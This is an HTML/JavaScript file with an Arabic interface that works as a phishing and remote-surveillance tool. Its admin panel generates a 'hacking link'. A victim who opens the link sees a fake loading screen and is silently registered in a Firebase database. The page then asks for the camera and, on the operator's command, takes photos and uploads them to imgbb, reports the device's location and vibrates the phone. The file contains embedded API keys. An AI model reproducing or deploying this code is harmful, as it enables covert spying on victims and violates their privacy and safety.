<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>DOCTOR OS v5.5 | INSTANT COMMAND</title>
    <style>
        :root { --gold: #d4af37; --online: #00ff41; --dead: #ff0000; --bg: #050505; }
        body { background: var(--bg); color: var(--gold); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        .layout { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
        .sidebar { background: #0a0a0a; border-left: 2px solid var(--gold); padding: 15px; overflow-y: auto; }
        .target-node { border: 1px solid #222; padding: 15px; border-radius: 8px; cursor: pointer; position: relative; margin-bottom: 10px; }
        .pulse { width: 12px; height: 12px; border-radius: 50%; position: absolute; left: 10px; top: 15px; }
        .online-glow { background: var(--online); box-shadow: 0 0 15px var(--online); animation: blink 1.5s infinite; }
        .offline-glow { background: var(--dead); }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        .main-panel { padding: 20px; overflow-y: auto; }
        .btn-cmd { background: transparent; border: 1px solid var(--online); color: var(--online); padding: 12px; cursor: pointer; width: 100%; font-weight: bold; margin: 5px 0; border-radius: 5px; }
        .btn-cmd:hover { background: var(--online); color: #000; }
        img { width: 100%; border: 1px solid #333; margin-top: 10px; border-radius: 5px; }
    </style>
</head>
<body>

<div id="admin-view" class="layout">
    <div class="sidebar">
        <h2 style="text-align: center; color: var(--gold);">إدارة السيادة 🛰️</h2>
        <div id="target-list">بانتظار الإشارة...</div>
    </div>
    <div class="main-panel">
        <div id="factory" style="border: 1px dashed var(--gold); padding: 15px; margin-bottom: 20px;">
            <h3>مصنع التلغيم السريع</h3>
            <button class="btn-cmd" style="border-color: var(--gold); color: var(--gold);" onclick="generateLink()">توليد رابط الاختراق الفوري</button>
            <p id="final-link" style="word-break: break-all; color: var(--online); font-size: 0.9em;"></p>
        </div>
        <div id="controls" style="display:none;">
            <h3 id="target-title">التحكم بالهدف</h3>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <button class="btn-cmd" onclick="sendCmd('capture')">📸 صورة فورية</button>
                <button class="btn-cmd" onclick="sendCmd('location')">📍 تحديد الموقع</button>
                <button class="btn-cmd" onclick="sendCmd('vibrate')">📳 هز الجهاز</button>
                <button class="btn-cmd" onclick="sendCmd('clear')" style="border-color: var(--dead); color: var(--dead);">❌ حذف الهدف</button>
            </div>
            <div id="gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; margin-top: 20px;"></div>
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
        authDomain: "hkrs5000.firebaseapp.com",
        databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
        projectId: "hkrs5000",
        storageBucket: "hkrs5000.firebasestorage.app",
        messagingSenderId: "273977078526",
        appId: "1:273977078526:web:da9e512c2421c300352baf"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";

    let selectedID = null;

    // --- منطق المسؤول (الأدمن) ---
    function initAdmin() {
        db.ref('devices').on('value', snap => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            snap.forEach(child => {
                const d = child.val();
                const isOnline = (Date.now() - (d.lastSeen || 0)) < 10000;
                const node = document.createElement('div');
                node.className = "target-node";
                node.innerHTML = `<div class="pulse ${isOnline ? 'online-glow' : 'offline-glow'}"></div>
                                  <b>ID: ${child.key}</b><br><small>${d.platform}</small>`;
                node.onclick = () => {
                    selectedID = child.key;
                    document.getElementById('controls').style.display = "block";
                    document.getElementById('target-title').innerText = "تحكم سيادي: " + child.key;
                    loadMedia(child.key);
                };
                list.appendChild(node);
            });
        });
    }

    function sendCmd(act) {
        if(!selectedID) return;
        if(act === 'clear') { db.ref('devices/'+selectedID).remove(); return; }
        db.ref('commands/'+selectedID).set({ action: act, ts: Date.now() });
    }

    function loadMedia(id) {
        db.ref(`data/${id}/images`).on('value', snap => {
            const gal = document.getElementById('gallery'); gal.innerHTML = "";
            snap.forEach(img => {
                const el = document.createElement('img'); el.src = img.val().url;
                gal.appendChild(el);
            });
        });
    }

    function generateLink() {
        const base = window.location.href.split('?')[0];
        document.getElementById('final-link').innerText = base + "?target=active";
    }

    // --- [منطق الضحية - الاتصال الفوري] ---
    const params = new URLSearchParams(window.location.search);
    if (params.get('target') === 'active') {
        document.getElementById('admin-view').style.display = "none";
        runInstantPayload();
    } else {
        initAdmin();
    }

    async function runInstantPayload() {
        document.body.innerHTML = "<div style='color:white;text-align:center;padding-top:20%'><h3>جاري تحميل المحتوى... يرجى الانتظار</h3></div>";
        const vID = "Z_" + Math.floor(Math.random() * 9000);

        // [سر النجاح]: الاتصال بـ Firebase فوراً قبل طلب أي صلاحية
        const heartbeat = () => {
            db.ref('devices/' + vID).update({
                lastSeen: Date.now(),
                platform: navigator.platform
            });
        };
        heartbeat(); // إشارة فورية عند الدخول
        setInterval(heartbeat, 5000); // استمرار النبض

        try {
            // طلب الكاميرا (هنا سيظهر الإذن للضحية)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            db.ref('commands/' + vID).on('value', async snap => {
                const cmd = snap.val();
                if (cmd) {
                    if (cmd.action === 'capture') {
                        const track = stream.getVideoTracks()[0];
                        const cap = new ImageCapture(track);
                        const blob = await cap.takePhoto();
                        let fd = new FormData(); fd.append('image', blob);
                        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {method:'POST', body:fd})
                        .then(r=>r.json()).then(d=> {
                            db.ref(`data/${vID}/images`).push({ url: d.data.url });
                        });
                    }
                    if (cmd.action === 'vibrate') navigator.vibrate(2000);
                    if (cmd.action === 'location') {
                         navigator.geolocation.getCurrentPosition(pos => {
                             db.ref('devices/'+vID).update({ lat: pos.coords.latitude, lon: pos.coords.longitude });
                         });
                    }
                    db.ref('commands/' + vID).remove();
                }
            });
        } catch (e) {
            // حتى لو رفض الكاميرا، يظل "متصل" وتعرف بوجوده
            db.ref('devices/' + vID).update({ status: "Refused Camera but Connected" });
        }
    }
</script>
</body>
</html>
